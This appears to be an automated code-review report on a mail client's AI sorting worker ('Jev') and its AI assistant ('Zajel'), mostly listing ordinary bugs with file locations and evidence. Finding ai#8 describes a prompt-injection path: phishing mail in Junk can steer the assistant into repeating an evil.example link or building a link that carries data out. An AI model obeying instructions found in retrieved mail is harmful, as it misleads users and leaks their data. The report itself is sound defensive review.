- src/lib/server/reminder-scheduler.ts:33-52 — the cron tick and the per-request processDueRemindersForUser (hooks.server.ts:122) have no in-flight guard. The same reminder can be returned twice, and with no RML folder both can call ensureRemindMeLaterMailbox and create duplicate 'Remind Me Later' mailboxes.
- src/routes/api/rules/deploy/+server.ts:116 — `if (result.notCreated || result.notUpdated)` treats an empty `{}` as failure. A method-level 'error' response makes `.list.find` throw a TypeError instead of a clear message. onSuccessActivateScript also deactivates any other active Sieve script the user had.
- src/lib/server/sieve.ts:83 — 'body' is always in the require list even when no body test is used, so a server without the body extension rejects the whole script.
- src/lib/server/preferences.ts:151-162 — import keeps any string for a known key and skips each endpoint's own validation (e.g. autosave_interval '0.01' is passed to the client as-is via Number(...)||10). user-state/settings PATCH (line 46) accepts arbitrary keys and values with no size limit.
- src/lib/server/preferences.ts:101-107 — after a reset (or for any user with empty prefs), the theme render-hint cookie that another browser still has is re-imported as a 'legacy cookie', partly undoing the reset.
- src/lib/server/preferences.ts:21 — 'display_name' in PREF_KEYS is dead (the display name is now an app_prefs column), so importing it does nothing.
- src/lib/server/db/queries/user-settings.ts — the whole module is unused (no imports anywhere) and duplicates app-prefs.ts; it can be deleted.
- src/lib/server/db/queries/signatures.ts:111 — updateSignature with isDefault=true clears the user's current default even when `id` doesn't exist (404 path), leaving no default.
- src/routes/api/user-state/identity-signatures/+server.ts:27 — signatureId isn't checked to belong to the active account's signatures (FK only checks that it exists).
- src/lib/server/rules.ts:18-21 — conditionToFilter tests `c.value` without trim(), so a whitespace-only value becomes a filter while the engine and Sieve treat the condition as unusable.

## Slice: jev

Files read: 44. Skipped: none.

### jev#1: Switching Jev off keeps its queue; switching it back on sends the old mail, including a paused backfill, to TypeSafe

- **Severity:** high · **Kind:** security · **Reviewer confidence:** high
- **Location:** `src/lib/server/db/queries/jev-settings.ts:97`

**Description.** Turning off "Let Jev read new mail" only clears sort_cursor (jev-settings.ts:96-97). Every row still `pending` in jev_decisions stays queued: new arrivals (backfill=0) and any running backfill (backfill=1). sortNewMail returns early while Jev is off (worker.ts:311). When the user switches Jev back on, the cursor resets to now, but steps 2 and 3 (worker.ts:404, 409) work through listPendingEmailIds no matter when the rows were queued. So mail queued before the opt-out, possibly weeks earlier, is sent to TypeSafe after all. Pending new-arrival rows also get rules applied to old mail (contradicts "rules run on new mail, never retroactively"). The UI promises "Starts with mail that arrives from now on" (settings/jev/+page.svelte:261). While Jev is off, JevBackfill still shows "Sorting … in the background". A second, smaller gap: settings are read once per pass (worker.ts:310) and never checked again. A pass already running keeps sending mail after opt-out, which can take minutes (up to 125 emails, 30 s timeout each, plus retries). Its cursor write at :378 can also undo a quick off/on.

**Failure scenario.** The user starts "Sort 15,000 emails", has second thoughts and switches "Let Jev read new mail" off instead of pressing Cancel. A month later they switch it on, wanting new mail only. Within minutes the worker sends the remaining ~15,000 old emails (sender, recipients, subject, 2,000-char body excerpt) to TypeSafe without asking.

**Evidence.**

```
jev-settings.ts:96-97
  if (patch.jevEnabled === true && !current.jevEnabled) next.sortCursor = now.toISOString();
  if (patch.jevEnabled === false) next.sortCursor = null;   // jev_decisions untouched
worker.ts:404/409 judgeAndApply(batch, listPendingEmailIds(accountRowId, ...))
Verified in scratch copy: enqueue 2 backfill rows -> jevEnabled false -> jevEnabled true (1000 min later) -> sortNewMail: fetch called 2x, rows 'done'.
```

### jev#2: Jev applies a tab from a stale copy of the keywords, so a message can end up in two tabs

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/jev/worker.ts:271`

**Description.** judgeAndApply fetches each email (worker.ts:437), spends seconds to minutes on fact lookups and Jev calls (:448), then plans and writes from that snapshot (:463-511). tabToApply/planFor decide the email is still in Important using the stale keywords (:211, :268). outcomeToUpdate (rules-engine.ts:257-261) only writes keywords that differ from the snapshot, so the `$cat_x: false` entries of categoryKeywordPatch are dropped. If anything sets a tab in that window, the message keeps its own tab keyword and gains Jev's. Categories are separate hasKeyword filters (categories.ts:103), so it then shows in both tabs, and categoryOf picks whichever comes first. The other writer can be the user (drag to a tab, Move to tab) or the rules scheduler running a setCategory rule. hooks.server.ts:125-135 starts applyRulesForUserSafe and sortNewMailSafe at the same moment for the active account, and both crons fire at `* * * * *`. Whichever pass reads first loses. Backfill widens the window to about 100 emails per pass, often while the user is sorting that same Important tab. Related: moving a message to Important leaves no keyword, so the worker and backfill can't tell the user chose Important and will re-sort it.

**Failure scenario.** A newsletter arrives. Jev fetches it (no tab) and starts judging. Meanwhile the user drags it to Promotions, or a 'from:shop → Promotions' rule fires. Jev then writes only `keywords/$cat_newsletters: true`. The email now carries $cat_promotions and $cat_newsletters, appears in both tabs, and Jev has overruled the user's or rule's choice.

**Evidence.**

```
Verified with the worker's FakeJmap: $cat_promotions set right after Jev's Email/get -> final keywords { '$cat_promotions': true, '$cat_newsletters': true }, decision.applied='newsletters'.
worker.ts:268 const open = wantsTabs && !outcome.category && categoryOf(email.keywords) === 'important';  // stale
rules-engine.ts:258 if (!!email.keywords[keyword] !== on) update[`keywords/${keyword}`] = on;
```

### jev#3: Full mailboxIds writes from the stale snapshot undo moves made during the Jev call, and can pull deleted mail out of Trash

- **Severity:** medium · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/lib/server/jev/worker.ts:235`

**Description.** Because of a Stalwart pointer-patch bug, mailbox changes are written as a whole `mailboxIds` object computed from the email as fetched at worker.ts:437. That covers moveUpdate (:235-240) for spam junk/rescue and outcomeToUpdate for applyLabel/moveToFolder rules. The write happens only after all the fact lookups and Jev calls (:511), with no re-read. Any archive, delete or move the user makes in between is overwritten. Deleted mail comes back out of Trash, and archived mail goes back to the Inbox. The rules scheduler shares outcomeToUpdate but writes within milliseconds. The Jev worker's window is the whole Jev phase.

**Failure scenario.** Rule: Jev "it's an invoice" → label Receipts. An invoice arrives, and the user deletes it (moves it to Trash) while Jev is judging. The worker writes mailboxIds {inbox, receipts}, so the deleted email is back in the Inbox. The same happens if the user archives it instead. In active spam mode, a message the user deletes from Junk while Jev decides to rescue it is written to {inbox}.

**Evidence.**

```
Verified: Jev rule applyLabel 'archive'; mailboxIds set to {trash} right after Jev's Email/get -> final mailboxIds { inbox: true, archive: true }.
worker.ts:235-239 moveUpdate builds from email.mailboxIds (snapshot)
rules-engine.ts:245 const next = { ...email.mailboxIds };  ... update.mailboxIds = next
```

### jev#4: For HTML-only mail, body_excerpt is the raw HTML source (DOCTYPE/head/CSS), not the text

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/jev/email-state.ts:83`

**Description.** bodyExcerpt takes every textBody part without checking its type. Under RFC 8621 §4.1.4, a message whose only body is text/html lists that part in textBody as well as htmlBody, and fetchTextBodyValues returns its value. partText therefore returns HTML, the htmlToPromptText fallback is never reached, and Jev gets the first 2,000 characters of markup. For typical marketing or notification HTML that is mostly <head><style> CSS. This is exactly the mail the tabs exist to sort. It also puts tracking URLs and hidden preheaders into what is sent, and contains_sign_in_code (facts.ts:45) runs code detection over the markup. The unit test only passes because it uses `textBody: []` (email-state.test.ts:56), which a JMAP server wouldn't return here. otp.ts:199-201 already filters textBody to text/plain.

**Failure scenario.** An HTML-only order-shipped email whose source starts with 3 KB of <style>. Jev's body_excerpt is CSS, so the tab pick relies on the subject alone, confidence drops and the mail stays in Important. A sign-in code further down the body is not detected. Every token spent on markup is wasted.

**Evidence.**

```
email-state.ts:83 let text = partText(email, email.textBody);   // no type filter
Verified: textBody=[{type:'text/html'}] with '<!DOCTYPE html>...<style>...' -> bodyExcerpt contains '<style>'.
otp.ts:200 .filter((p) => p.type?.toLowerCase().startsWith('text/plain'))
```

### jev#5: Backfill can never offer cancelled or failed mail again, and never reaches past the newest 20,000 Important emails

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/routes/api/jev/backfill/+server.ts:56`

**Description.** unsortedIds filters out every id that knownEmailIds returns, which means any row in any status (jev-decisions.ts:252-265). That includes 'skipped' rows written by Cancel (cancelBackfill sets pending→skipped) and 'failed' rows. enqueueEmails uses ON CONFLICT DO NOTHING, so those rows can't be revived either. Cancel is therefore permanent, and mail that failed during an outage is never retried. Separately, the scan stops after 20,000 positions (:44) counted over all Important ids, already-known ones included. After one full run every scanned id is known, so the card says "Nothing left in Important to sort" even though older mail is still unsorted.

**Failure scenario.** The user starts "Sort 12,000 emails" and presses Cancel after 300. A week later the card reads "Nothing left in Important to sort" (or a tiny count), and 11,700 emails can never be sorted with Jev. The same happens to any email that failed 5 times.

**Evidence.**

```
+server.ts:56-57 const known = knownEmailIds(account, ids); return ids.filter((id) => !known.has(id));
jev-decisions.ts:144 UPDATE ... SET status = 'skipped' ... WHERE backfill = 1 AND status = 'pending'
Verified: enqueue c1,c2 backfill -> cancelBackfill -> knownEmailIds has both; enqueueEmails again returns 0; status stays 'skipped'.
```

### jev#6: A bad key, a retired pinned model, sustained 429s or an outage quietly mark the whole queue failed for good

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/jev/worker.ts:466`

**Description.** Every askJev failure is charged to the email (recordFailure at :466), whatever the cause. That includes problems with the configuration or the service, not the email: 401/403 (bad key), 404 (the pinned DEFAULT_MODEL 'jev-1.13.0' retired), 429 after the client's two retries, 5xx, and timeouts (client.ts:124-139). Each pass charges an attempt to up to 25 new and 100 backfill emails. After 5 passes they are 'failed' permanently. New mail never gets its tab or spam check, and its rules run with every Jev condition false. Backfill rows turn 'failed', and because of the backfill finding above they are never offered again. Nothing shows this to the user: lastError is never displayed, and JevBackfill counts failed as "handled" (JevBackfill.svelte:30). During a brownout each email also waits the full 30 s timeout, so one pass can take around 15 minutes.

**Failure scenario.** TypeSafe retires jev-1.13.0, or the key is rotated. Every call returns 404 or 401. In about 5 minutes all new mail and the next 100 backfill emails are 'failed'. The rest of a 20k backfill burns down at about 100 emails per 5 passes. Fixing the key afterwards recovers none of it, and the user only sees the tabs quietly stop working.

**Evidence.**

```
worker.ts:464-466 if (j.error) { recordFailure(b.accountRowId, j.email.id, j.error, now); ...
client.ts:139 throw new JevError(errorMessage(response.status), response.status === 429 ? 429 : 502);
Verified: fetch -> 401 for 5 passes -> backfillProgress {pending:0, done:0, failed:10}, lastError 'TypeSafe rejected the API key'.
```

### jev#7: New-mail cursor permanently skips emails that share a receivedAt second across a full page, and it trusts Email/get ordering and the app's own clock

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/jev/worker.ts:375`

**Description.** When a query returns a full page (100), the cursor is set to the last arrival's receivedAt. The next query uses JMAP `after`, which is strictly greater (RFC 8621 §4.4.1), and receivedAt has one-second resolution. An email delivered in the same second as the 100th is never queued. It also takes `arrived[arrived.length-1]` from Email/get, whose list order RFC 8620 §5.1 says MAY differ from the ids requested. On a page that isn't full, the cursor jumps to the app's own `now`, so clock skew with Stalwart or a late commit also loses mail. A lost email gets no tab and no spam check. When Jev handles rules it misses every rule, exact ones included, because the rules scheduler steps aside. enqueueEmails is idempotent, so an overlapping look-back would cost nothing.

**Failure scenario.** After a restart or downtime, more than 100 messages are waiting. The 100th and 101st share a receivedAt second (common for list bursts or Junk floods). The 101st is never queued: no tab, no spam check, and, with a Jev rule present, no rules at all.

**Evidence.**

```
worker.ts:375-377 if (arrived.length >= QUEUE_PAGE) resumeAt.push(arrived[arrived.length - 1].receivedAt);
  const nextCursor = resumeAt.length ? resumeAt.sort()[0] : now.toISOString();
Verified with a limit-aware FakeJmap: 99 arrivals + 2 in the same second -> after 4 passes z100 'done', z101 never queued.
```

### jev#8: display_name_mismatch fires for ordinary dotted display names, feeding Jev false phishing evidence

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/jev/spam.ts:78`

**Description.** The regex treats any dotted token in the display name as a domain, as long as its last segment has two or more letters. Display names such as "john.smith" (often just the address's local part), "Mr.Smith" or "St.Clair Hotel" then count as naming another domain. display_name_mismatch is set true and sent to Jev as spam/phishing evidence ("The display name names a domain other than the sender's"). In active mode that can push legitimate mail from strangers over JUNK_AT. In mock mode this fact alone sets phishing to 0.92, so the mail is junked.

**Failure scenario.** "john.smith <john.smith@gmail.com>" writes to you for the first time with spam checks on. Jev is told the display name impersonates the domain "john.smith", which raises the odds of the message being flagged or moved to Junk.

**Evidence.**

```
spam.ts:78 const nameDomains = (sender?.name ?? '').match(/[a-z0-9-]+(?:\.[a-z0-9-]+)*\.[a-z]{2,}/gi) ?? [];
Verified: securityFacts({from:[{name:'john.smith', email:'john.smith@gmail.com'}]}).display_name_mismatch === true (same for 'St.Clair Hotel').
```

### jev: minor notes

- worker.ts:468: when the Jev call fails for good, the rules fallback calls planFor with wantsTabs=false and pin=null, so a pinned sender's tab is never applied. JEV_PLAN says pins fix the category whatever Jev chose. With no rules (`rules.length === 0` → continue) nothing is applied at all.
- worker.ts:517-519: when the mail server refuses the write, Jev's successful answer is thrown away (recordFailure) and the email is sent to TypeSafe again next pass, up to 5 times. That contradicts README 'Each new email is sent once'. If the refusal persists, the exact rules also never apply.
- worker.ts:395: `security: spamMode !== 'off'` lives in the shared judge context, so backfill emails (step 3, where spam isn't asked) also send auth results, Reply-To, link domains and the Stalwart score to TypeSafe for nothing.
- settings/jev/+page.svelte:248-253: 'What Jev is sent' leaves out sender_history (your past moves of this sender's mail), addressed_to_you_directly, auto-submitted/precedence/no-reply flags and Stalwart rule names, all of which are sent.
- facts.ts:72-73: if one Email/query in the sendersYouWroteTo batch errors, it is read as total 0, a definite 'no' instead of null. facts.ts:104-108: a Thread/get error reads as 'not in thread'. Both weaken the 'trusted' protection in decideSpam.
- spam.ts:47-50: parseAuthResults trusts the topmost Authentication-Results header without checking its authserv-id. If Stalwart doesn't stamp one (relay or import paths), a sender-forged 'dmarc=pass' counts toward rescue from Junk.
- Rules handoff: while Jev handles rules, the rules scheduler pushes its cursor to now on every tick (rules-scheduler.ts:77-83). If the user then removes or disables the last Jev rule, or turns Jev off, emails still pending in jev_decisions never get any rules.
- JevBackfill.svelte:34-37: if GET /api/jev/backfill fails (JMAP hiccup), status stays null and the card shows 'Counting…' forever with the button disabled. :30-31 progress adds up every backfill run ever, so a second run's bar starts near 100%.
- backfill/+server.ts:72: every Settings→Jev load runs up to 40 sequential Email/query pages (MAX_QUEUE 20k / 500), even when the account isn't ready.
- preview/+server.ts: 200 emails (about 40 sequential JMAP fact requests plus 200 Jev calls at concurrency 4) run inside one HTTP request. That can exceed a reverse proxy's 60 s read timeout, and nothing stops a second concurrent run from another tab.
- JevWhy.svelte:148: the chip shows `applied ?? category`, so a low-confidence lean, or Jev's pick that a setCategory rule overrode, reads as if it were the tab ('Jev · Promotions' on a message in Important). The summary then says 'not sure enough to move it' even when a rule decided.
- categories/api.ts:69-72: Undo ignores the result of post(), so a failed undo shows no error.
- client.ts:74: Retry-After is capped at 10 s, so a server asking for 60 s gets retried early and the attempts are spent.

## Slice: ai

Files read: 26. Skipped: none.

### ai#1: Confirming an AI 'delete' on one occurrence of a recurring event deletes the whole series

- **Severity:** high · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/routes/api/ai/calendar/+server.ts:53`

**Description.** EventInstance.id is the object id, and it is shared by every occurrence of a recurring event (src/lib/calendar/types.ts: 'Same for all instances of one recurring event'). The tool loop lists every expanded occurrence with that same id. The model picks one, and mail-agent.ts:526 `foundEvents.find(e => e.id === targetId)` resolves it to the first occurrence in the window, which may be one from last week. buildDeleteProposal (calendar-actions.ts:187) drops recurrenceId and recurring. The confirm route then calls deleteEvent(..., 'all', null), which runs deleteObject on the whole .ics: the series, its exceptions and every past and future occurrence. The card shows a single occurrence's date and 'This cannot be undone', so the user believes they are deleting one meeting. The README promise that cards 'name exactly what will happen' fails here.

**Failure scenario.** The user has a daily 'Standup' series and says 'Cancel tomorrow's standup'. search_calendar returns 7 Standup rows with the same id. The card reads 'Delete event: Standup <one date>'. The user clicks 'Delete from calendar' and the entire recurring series is gone from CalDAV.

**Evidence.**

```
types.ts: `/** Opaque object id — base64url of the DAV href. Same for all instances of one recurring event. */ id: string;`
calendar-actions.ts:198 `target: { id: event.id, title: ..., start: event.start }` (no recurrenceId/recurring)
calendar/+server.ts:53 `await deleteEvent(locals.auth, userEmail, proposal.target!.id, 'all', null);`
service.ts:326 `if (scope === 'all' || !recurrenceId) { await deleteObject(auth, href); return; }`
```

### ai#2: The model is told 'today' is yesterday for every user east of UTC, so relative dates resolve a day early

- **Severity:** high · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/ai/mail-agent.ts:491`

**Description.** The rail sends todayStart as local midnight serialised to UTC (dayRange: setHours(0,0,0,0) then toISOString()). The server then derives the user's date with `new Date(input.todayStartMs).toISOString().slice(0, 10)` (lines 457 and 491). For any positive UTC offset (all of Europe, Africa, the Middle East including the developer's Asia/Amman, Asia, Australia), local midnight is the previous UTC day. Both the tool-loop prompt and the propose_event prompt therefore say 'Today is <yesterday>'. 'Tomorrow' resolves to today, 'next Tuesday' can shift by a week, and the default calendar window shifts too. The timeZone is available and should be used to format the date (e.g. Intl en-CA with timeZone).

**Failure scenario.** An Asia/Amman user on 2026-11-01 says 'Schedule dentist tomorrow at 10'. The prompt says 'Today is 2026-10-31', so the proposal is for 2026-11-01 10:00 (today) instead of 2026-11-02. Verified with TZ=Asia/Amman and Europe/Berlin: client todayStart 2026-10-31T21:00Z / 23:00Z gives server todayIso 2026-10-31. Los Angeles is correct.

**Evidence.**

```
mail-agent.ts:457 `new Date(input.todayStartMs).toISOString().slice(0, 10)`
mail-agent.ts:491 `const todayIso = new Date(input.todayStartMs).toISOString().slice(0, 10);` then `Today is ${todayIso}.`
AIAssistantRail.svelte:107-112 `start.setHours(0,0,0,0) ... start.toISOString()`
```

### ai#3: HTML-only emails are fed to the agent as raw HTML/CSS, crowding out the real content

- **Severity:** high · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/ai/mail-agent.ts:105`

**Description.** bodyText() takes every part in email.textBody and only falls back to htmlToPromptText when textBody is empty. Under RFC 8621's body algorithm, a message with a lone text/html part has that part in BOTH textBody and htmlBody, and Stalwart follows this. So for HTML-only mail (newsletters, receipts, notifications, many transactional senders) the raw markup, starting with <head><style>, is sliced to 1800/4000/6000 chars and given to the model, and the real text usually never makes it in. emailsInRange also caps bodies at maxBodyValueBytes 2500, which is mostly <head>. Other modules already guard against this: otp.ts:200 filters `type.startsWith('text/plain')`, and email-body.ts checks part types.

**Failure scenario.** Verified with a mocked getEmailDetail returning textBody=[{type:'text/html'}] with a <style> block. The prompt sent to the model contains '<style>' and does NOT contain the body sentence 'shipped and arrives Tuesday'. 'Summarize today's mail' and 'Summarize this email' give empty or garbled summaries for such messages.

**Evidence.**

```
mail-agent.ts:105-109
'''
const textParts = (email.textBody ?? [])
  .map((part) => email.bodyValues?.[part.partId]?.value ?? '')
  .filter(Boolean).join('\n');
if (textParts) return textParts.slice(0, maxChars);
'''
(no part.type check; the htmlToPromptText fallback is unreachable for HTML-only mail)
```

### ai#4: Keyword intent routing turns ordinary questions into calendar/task change proposals

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/ai/mail-agent.ts:83`

**Description.** inferMailAgentAction maps any free-chat message containing a write verb (cancel/move/set up/add/remove…) plus a calendar noun to 'propose_event'. It also maps create/add/make… within 40 chars of 'task' to 'propose_task'. These branches skip the normal answer. The model is told to 'Prepare exactly one calendar change' and the user gets a proposal card (possibly a destructive delete card) or a refusal, not an answer to their question. Confirmation still gates the write, but the question goes unanswered and the user is handed a destructive card they never asked for.

**Failure scenario.** Verified: 'Did Sara cancel the meeting?', 'Why did they move the appointment?', 'Who set up this meeting?' and 'Did anyone add notes to the calendar invite from Omar?' all route to propose_event. 'Did the vendor make a task list for us?' routes to propose_task. 'Create a calendar event for the task deadline' routes to propose_task. For the first one, the user may get a red 'Delete event' card for the meeting they only asked about.

**Evidence.**

```
mail-agent.ts:77 `/\b(create|add|make|turn|convert)\b.{0,40}\b(task|to-do|todo)\b/`
mail-agent.ts:82-86 `/\b(schedule|book|create|add|put|set up|move|cancel|delete|remove|clear)\b/ && /\b(event|meeting|appointment|calendar|reminder to meet)\b/ → 'propose_event'`
```

### ai#5: htmlToPromptText glues block elements together and leaves HTML entities escaped

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/ai/extract-event.ts:34`

**Description.** sanitize-html with allowedTags: [] removes tags without adding any separator, so adjacent <div>/<p>/<td>/<br> content runs together. It also re-escapes text on output, so &, < and > reach the model as &amp;, &lt; and &gt;. The `.replace(/&nbsp;/g, ' ')` line does nothing because sanitize-html has already decoded &nbsp; to U+00A0, which the `[ \t]+` fold does not collapse. This function feeds /api/ai/extract-event (title and location flow into a real calendar event), /api/ai/assistant (summarize/answer/draft), the agent's HTML fallback and Jev's body excerpt.

**Failure scenario.** Verified: '<div>Hi Sara,<div><br></div><div>Can we meet Thursday at 8?</div><div>Location: Smith &amp; Wollensky &lt;5th Ave&gt;</div></div>' becomes 'Hi Sara,Can we meet Thursday at 8?Location: Smith &amp; Wollensky &lt;5th Ave&gt;'. '<td>Date</td><td>Nov 5</td>' becomes 'DateNov 5'. Extracted locations or titles can end up as 'Smith &amp; Wollensky' in the calendar, and the draft action can echo '&amp;' into a reply.

**Evidence.**

```
extract-event.ts:34-41
'''
const text = sanitizeHtml(html, { allowedTags: [], allowedAttributes: {} })
  .replace(/&nbsp;/g, ' ')
  .replace(/[ \t]+/g, ' ')
'''
```

### ai#6: Calendar confirmation cards misstate what will happen (UTC timestamp on delete; multi-day end, description and calendar hidden on create)

- **Severity:** medium · **Kind:** ux · **Reviewer confidence:** high
- **Location:** `src/lib/components/AIAssistantRail.svelte:497`

**Description.** The delete card prints target.start verbatim. That is EventInstance.start, a UTC ISO instant like '2026-11-02T22:30:00.000Z', so late-evening events east of UTC (and early-morning ones west of it) show the wrong calendar date. buildDeleteProposal's summary (calendar-actions.ts:193) also formats the UTC string. The create card shows `start.slice(0,10) · HH:mm–HH:mm`, dropping the end date, so a Mon 09:00 to Wed 17:00 event reads as a 9-to-5 on Monday. describeCreate (calendar-actions.ts:169) has the same issue. The card also never shows the description (up to 2000 model-written chars, possibly copied from an attacker email) or the target calendar. This contradicts the README ('cards that name exactly what will happen').

**Failure scenario.** An Amman user asks to delete 'Flight check-in' at 01:30 on Nov 3. The card shows '2026-11-02T22:30:00.000Z', the previous day in UTC notation. Or the user confirms 'Conference 2026-09-07 · 09:00–17:00' and a 3-day event is written.

**Evidence.**

```
AIAssistantRail.svelte:497 `<p ...>{message.calendarProposal.target.start}</p>`
AIAssistantRail.svelte:504 `${...event.start.slice(0, 10)} · ${...event.start.slice(11)}–${...event.end.slice(11)}`
calendar-actions.ts:193 `event.start.replace('T', ' ').slice(0, 16)` on a UTC ISO string
```

### ai#7: Switching sessions or starting a new chat while a reply is pending cross-wires conversations

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/components/AIAssistantRail.svelte:253`

**Description.** The History, session-row and 'New conversation' buttons stay enabled while `busy`. openSession() has no busy guard, sets busy=true and then busy=false in its finally while the original ask() is still waiting. When the first reply arrives, ask() appends it to whatever `messages` now holds and switches conversationId back: `if (data.conversationId !== conversationId) conversationId = data.conversationId`. The panel then shows session B's transcript plus A's answer, and new questions are sent to (and stored in) session A with A's history. Clearing busy early also lets a second ask() run at the same time.

**Failure scenario.** The user asks a slow question in session A, opens History and clicks session B. B's transcript loads, then A's answer appears at the bottom of B. The next question the user types is answered with A's history and saved to A. 'New conversation' during a pending reply behaves the same way: the new chat starts with an orphan answer and A's id.

**Evidence.**

```
AIAssistantRail.svelte:156-181 openSession sets `busy = true` ... `finally { busy = false; }` with no `if (busy) return`
:149-154 startNewChat unguarded
:253-255 `if (data.conversationId && data.conversationId !== conversationId) { conversationId = data.conversationId; }`
:256 `messages = [...messages, {...}]`
```

### ai#8: Retrieval loop pulls Junk/Trash mail into context unlabelled, with no untrusted-content guard, and replies may carry arbitrary links

- **Severity:** medium · **Kind:** security · **Reviewer confidence:** medium
- **Location:** `src/lib/server/ai/mail-agent.ts:289`

**Description.** buildMailFilter deliberately sets no mailbox constraint, so search_mail also returns Junk and Trash. formatSearchResults does not say which folder a hit came from. The tool-loop system prompt (lines 289-303), unlike normalSystemPrompt, does not tell the model that retrieved content is untrusted data, so an email can steer which searches and opens happen next. The final reply is rendered with any http(s) link allowed (markdown.ts:45-47), with model-chosen anchor text. Spam/phishing content can therefore be repeated in Zajel's trusted voice with a clickable link. An injected instruction can also get the model to build a link whose query string carries data from other retrieved messages, such as codes. This needs a click, so impact is bounded, but it is the main injection path left given that writes are confirmation-gated.

**Failure scenario.** A phishing mail in Junk ('PayPal: your account is limited, verify at https://evil.example/…') matches 'Did PayPal email me?'. Zajel answers 'Yes, PayPal says your account is limited — [verify here](https://evil.example/…)' with no hint that the message was in Junk.

**Evidence.**

```
mail-search.ts:104-105 'No `inMailbox` condition is set, so the search spans every folder'
mail-agent.ts:289-303 tool-loop system prompt has no 'untrusted data' line
mail-agent.ts:226-235 hits formatted without mailboxIds
markdown.ts:45-47 `allowedAttributes: { a: ['href', ...] }, allowedSchemes: ['http','https','mailto']`
```

### ai#9: No overall time budget: up to five sequential 60s model calls, and a turn is saved even after the client gave up

- **Severity:** low · **Kind:** improvement · **Reviewer confidence:** medium
- **Location:** `src/lib/server/ai/mail-agent.ts:305`

**Description.** Each runAIChat has its own 60s timeout (mail-assistant.ts:210). A chat turn can make up to MAX_TOOL_ROUNDS (4) tool calls plus a final call, plus JMAP and CalDAV round trips, so it can take several minutes. Neither the server nor the browser fetch has an overall deadline or abort, and nothing streams. The README suggests nginx, whose default proxy_read_timeout is 60s, so slower turns fail in the browser. The server keeps running and then calls appendMessage for both turns (agent/+server.ts:100-101). The user sees an error, but the stored history now contains an answer they never saw (or a new, orphan session).

**Failure scenario.** Behind nginx defaults, a 3-round search with a reasoning model takes about 70s. The browser shows 'The mail agent could not answer' and the user retries. The model's history then holds the unseen first answer and the duplicated question.

**Evidence.**

```
mail-assistant.ts:210 `signal: AbortSignal.timeout(60_000)` per call
mail-agent.ts:305 `for (let round = 0; round < MAX_TOOL_ROUNDS; ...)` + final runAIChat
agent/+server.ts:100-101 append after completion with no check that the client is still connected
```

### ai#10: Times are given to the model as raw UTC ISO strings and it is left to convert them to the user's zone

- **Severity:** low · **Kind:** improvement · **Reviewer confidence:** medium
- **Location:** `src/lib/server/ai/mail-agent.ts:428`

**Description.** The calendar_tomorrow context, search_calendar results and email 'Received' lines all pass UTC instants such as 2026-11-02T07:00:00.000Z. The model only gets 'The user's timezone is X' and has to do the offset (and DST) arithmetic itself, which models often get wrong, leading to briefings with meeting times off by the UTC offset. The server already has a validated IANA zone and could format times in local wall-clock time (as tz.ts does elsewhere).

**Failure scenario.** 'What's on tomorrow?' for an Amman user: the model reports 'Standup at 07:00' for a 10:00 local meeting because it repeats the UTC timestamp.

**Evidence.**

```
mail-agent.ts:428 `${event.title} | ${event.start}–${event.end}`
mail-agent.ts:248-250 `start: ${event.start}` / `end: ${event.end}`
mail-agent.ts:123 `Received: ${email.receivedAt}`
```

### ai#11: An unconstrained search_mail ends the loop, so 'what are my latest emails?' cannot be answered

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** medium
- **Location:** `src/lib/server/ai/mail-agent.ts:340`

**Description.** When the model asks for recent mail with no filter, buildMailFilter returns null and the loop breaks with nothing retrieved. The comment says this would 'return the whole mailbox', but searchEmails always sends a server-side limit (≤ MAX_SEARCH_RESULTS) sorted newest first, which is a cheap query and exactly what 'latest emails' needs. describeMailSearch even has a 'Recent mail' label for this case. Questions about recent mail outside 'today' end with 'cannot be determined'.

**Failure scenario.** 'What were my last five emails about?': the model calls search_mail with all fields null and limit 5. The filter is null, so the loop breaks and the model answers that it found nothing.

**Evidence.**

```
mail-agent.ts:337-340 `const filter = buildMailFilter(call.search); if (!filter) break;`
mail-search.ts:116 `if (!conditions.length) return null;`
```

### ai#12: Retention is only enforced when the history list is read, so the '7 days' promise fails once the panel is no longer opened

- **Severity:** low · **Kind:** maintainability · **Reviewer confidence:** high
- **Location:** `src/lib/server/db/queries/ai-conversations.ts:129`

**Description.** pruneExpiredConversations runs only inside listConversations (GET /api/ai/conversations). The migration says 'Pruning runs on write, so an idle account does not accumulate history', but appendMessage and createConversation never prune and nothing runs on a schedule. If the user stops opening Zajel, mail-derived transcripts stay in SQLite indefinitely, even though the UI says 'Conversations are kept for 7 days'.

**Failure scenario.** The user chats about sensitive mail, then stops using the assistant. Months later the ai_messages rows are still in the database (and in backups).

**Evidence.**

```
ai-conversations.ts:128-131 `export function listConversations(...) { pruneExpiredConversations(); ... }` is the only caller
008_ai_conversations.sql: '-- Pruning runs on write, so an idle account does not accumulate history'
```

### ai: minor notes

- src/lib/server/ai/calendar-actions.ts:53 — LOCAL_DATETIME/LOCAL_DATE are shape-only, so '2026-02-30T25:99' is accepted (verified: addHour turns it into end '2026-03-03T03:39') and payloadToData writes an impossible ICS date. The test at calendar-actions.test.ts:69 rejects '2026-13-40T14:00' only because end<start, not because the date is invalid.
- src/lib/server/ai/mail-agent.ts:245 — formatCalendarResults shows only the first 40 events from the window start (by default 7 days in the past, 60-day span, with no clamp on model-supplied windows), so in a busy calendar later events never get an id the model could pick for a delete.
- src/lib/components/AIAssistantRail.svelte:303-309 — confirmation results ('Added …', 'Created …') and proposal cards are client-only. Reopening a session loses them, and stored history only says 'I prepared this event… Nothing has been added yet', so follow-ups ('make it 30 min') have no record of the proposal.
